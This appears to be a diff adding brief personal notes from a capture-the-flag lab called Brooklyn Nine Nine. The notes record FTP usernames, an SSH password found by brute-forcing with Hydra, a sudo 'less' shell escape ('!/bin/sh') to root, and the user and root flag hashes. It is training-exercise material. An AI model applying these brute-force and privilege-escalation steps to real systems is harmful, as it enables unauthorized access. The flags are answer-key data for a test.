@@ -1,0 +1,32 @@
+
+
+		Brooklyn Nine Nine
+		
+------------------------------------------------------------]
+		
+		
+ftp -> jake, amy, holt
+		
+http -> http://10.10.122.97/
+
+ssh -> i tried hydra to brutforce ssh password 
+	and found jake password(987654321)
+	
+jake passwword -> 987654321
+
+------------------------------------------------------------]
+
+user -> /home/holt/user.txt
+		
+		user.txt -> ee11cbb19052e40b07aac0ca060c23ee
+		
+sudo -l ->   less
+
+		sudo less /etc/profile
+		!/bin/sh
+		
+root -> /root/root.text
+
+		root.txt -> 63a9f0ea7bb98050796b649e85481845
+		
+------------------------------------------------------------]
